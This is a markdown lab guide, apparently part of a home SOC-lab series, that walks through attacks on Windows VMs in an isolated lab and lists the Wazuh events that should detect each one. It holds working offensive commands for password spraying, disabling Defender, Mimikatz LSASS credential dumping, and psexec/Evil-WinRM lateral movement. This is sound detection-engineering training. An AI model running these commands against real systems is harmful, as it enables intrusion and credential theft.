# Phase 8 – Attack Scenarios

Executed from KALI (192.168.100.30) against DC01 (192.168.100.10) and WIN11 (192.168.100.20), all within the isolated `SOC-LAB` internal network. Each scenario below should be run, then confirmed in the Wazuh dashboard, before moving to the next — this keeps Phase 9/10 grounded in signals you've already seen land.

> **Before starting:** take a fresh VirtualBox snapshot of all four VMs now if you haven't already (`Phase 8 - pre-attack baseline`). Several of these scenarios are disruptive or trip AV — a snapshot means you can roll back instantly instead of rebuilding.

---

## 1. Nmap Scans

**Discovery scan** across the whole lab subnet:
```bash
nmap -sV -O 192.168.100.0/24
```

**Targeted enumeration** against each host once you know what's alive:
```bash
nmap -sC -sV -p- 192.168.100.10   # DC01 — expect AD-related ports: 53, 88, 135, 389, 445, 3268...
nmap -sC -sV -p- 192.168.100.20   # WIN11
```

`-p-` scans all 65535 ports and takes a few minutes — worth the wait for a full picture of what's exposed.

**Verify in Wazuh:** check Discover for a spike in Windows Firewall or Sysmon Event ID 3 (network connection) entries around the scan timeframe.

---

## 2. Password Spraying

**Using Hydra** against WinRM on WIN11, with a small user list and common password list:
```bash
hydra -L users.txt -P passwords.txt winrm://192.168.100.20
```
Create `users.txt` with one username per line (e.g. `John.Smith`, `Jane.Doe`, `Helpdesk`) and `passwords.txt` with a handful of common/guessable values. Keep the list small and the attempt rate low — this is meant to simulate a realistic spray, not a brute force, and gives you a cleaner signal to hunt for afterward (a handful of 4625 events, not thousands).

**Alternative using NetExec** (the actively maintained CrackMapExec successor — often cleaner output for this):
```bash
nxc smb 192.168.100.20 -u users.txt -p passwords.txt
```

**Verify in Wazuh:** filter for Windows Security Event ID 4625 (failed logon) on WIN11 — you should see one entry per spray attempt, spread across multiple usernames in a short window. That username-breadth pattern is the actual spray signature you'll hunt for in Phase 9.

---

## 3. Successful Login

Once you know (or set) a valid credential pair, connect via Evil-WinRM to confirm access:
```bash
evil-winrm -i 192.168.100.20 -u John.Smith -p 'ChangeMe123!'
```
A successful connection drops you into a PowerShell-like shell on WIN11.

**Verify in Wazuh:** Windows Security Event ID 4624 (successful logon) — note the Logon Type (3 = network, typical for WinRM) as a field you'll reference in Phase 9/11.

---

## 4. Encoded PowerShell

From the Evil-WinRM session (or any elevated session on the target), run a base64-encoded command — this specifically tests visibility into obfuscated command lines:
```powershell
powershell.exe -enc <base64string>
```
To generate a harmless test payload from Kali or any PowerShell prompt:
```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
```
Paste the resulting string in place of `<base64string>` above.

**Verify in Wazuh:** Sysmon Event ID 1 (process creation) where `CommandLine` contains `-enc` or `-EncodedCommand`. This is one of the highest-value detections in the whole lab — encoded PowerShell is a very common real-world obfuscation technique.

---

## 5. Scheduled Task Persistence

Create a scheduled task pointing at a benign binary, simulating a persistence mechanism:
```powershell
schtasks /create /tn "UpdateCheck" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru SYSTEM
```

**Verify in Wazuh:** Sysmon Event ID 1 (process creation) for `schtasks.exe`, and Windows Security Event ID 4698 (a scheduled task was created) — the latter requires "Audit Other Object Access Events" to be enabled in the domain's audit policy if it isn't already; check Group Policy / local security policy on DC01 if 4698 doesn't appear.

---

## 6. Credential Dumping (Mimikatz)

**Download** the latest release directly on the Windows target (WIN11 or DC01):
```
https://github.com/gentilkiwi/mimikatz/releases/latest
```
Grab the zip asset, extract it — you'll get `Win32` and `x64` folders.

**Before running it:** Windows Defender will almost certainly flag and quarantine Mimikatz on sight — it's one of the most heavily signatured tools that exists. Since the goal here is to observe *Sysmon's* detection of LSASS access (not to test AV evasion), temporarily disable real-time protection for this test:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
Remember to re-enable it afterward:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Run it** from an elevated prompt:
```powershell
cd C:\Path\To\mimikatz\x64
.\mimikatz.exe
```
Inside the Mimikatz console:
```
privilege::debug
sekurlsa::logonpasswords
```
`privilege::debug` should return `OK` — if it doesn't, you're not running elevated. `sekurlsa::logonpasswords` dumps credentials of logged-on users from LSASS memory.

**Verify in Wazuh:** Sysmon Event ID 10 (ProcessAccess) where `TargetImage` contains `lsass.exe` — this is the core detection for this entire technique, and one of the most important ones in the lab.

---

## 7. Lateral Movement

**Using Evil-WinRM** to pivot from Kali directly to another host with captured/known credentials:
```bash
evil-winrm -i 192.168.100.10 -u ITAdmin -p 'ChangeMe123!'
```

**Using Impacket's psexec.py** for a more classic lateral-movement technique (creates and runs a service remotely):
```bash
psexec.py SOCLAB/ITAdmin:'ChangeMe123!'@192.168.100.10
```

**Verify in Wazuh:** for PsExec-style movement, look for Windows Security Event ID 7045 (a new service was installed) and Sysmon Event ID 1 for the resulting spawned process — psexec-style tools have a distinctive parent/child signature worth noting for Phase 9.

---

## 8. Atomic Red Team Simulations

Run these **on the Windows target itself** (installed back in Phase 7's Kali setup note — actually installed on DC01/WIN11, not Kali):
```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

**Credential dumping technique** (maps directly to the Mimikatz scenario above, useful as a second data point):
```powershell
Invoke-AtomicTest T1003.001
```

**Scheduled task technique** (second data point for scenario 5 above):
```powershell
Invoke-AtomicTest T1053.005
```

Running the same technique two ways (manually, and via Atomic Red Team) is a good way to confirm your detection isn't accidentally keyed to something incidental about one specific tool's behavior.

**Verify in Wazuh:** same event IDs as the corresponding manual scenario above — confirm both trigger identically.

---

## MITRE ATT&CK Reference Table

Useful to carry forward into Phase 10 (Detection Engineering) and Phase 11 (Incident Response documentation) so every scenario has its technique ID ready to go.

| Scenario | Technique ID | Tactic |
|---|---|---|
| Nmap scans | T1046 | Discovery |
| Password spraying | T1110.003 | Credential Access |
| Successful login | T1078 | Initial Access / Persistence |
| Encoded PowerShell | T1059.001 | Execution |
| Scheduled task persistence | T1053.005 | Persistence |
| Credential dumping (Mimikatz) | T1003.001 | Credential Access |
| Lateral movement (PsExec/Evil-WinRM) | T1021.002 / T1021.006 | Lateral Movement |

---

## Common Failure Points

| Symptom | Likely Cause / Fix |
|---|---|
| Hydra returns nothing / all failures against WinRM | Confirm WinRM is enabled on the target: `Enable-PSRemoting -Force` (run once on WIN11/DC01) |
| Evil-WinRM connects but immediately drops | Usually a WinRM auth type mismatch — confirm the account isn't locked out from the earlier spray |
| Mimikatz binary disappears right after extraction | Defender quarantined it — check Windows Security → Protection history, restore, and disable real-time protection first next time |
| `sekurlsa::logonpasswords` returns no passwords, only NTLM hashes | Expected on modern Windows with credential guard / WDigest disabled by default — this is realistic behavior, not a failure. NTLM hashes are still enough for pass-the-hash style follow-on techniques if you want to extend the lab |
| psexec.py fails with "STATUS_ACCESS_DENIED" | Account used doesn't have local admin rights on the target — use ITAdmin (Domain Admin) rather than a standard user account |
| Nothing shows up in Wazuh for any of these | Go back and confirm the Sysmon `<localfile>` block from Phase 6 is still present and the agent service was restarted after adding it |
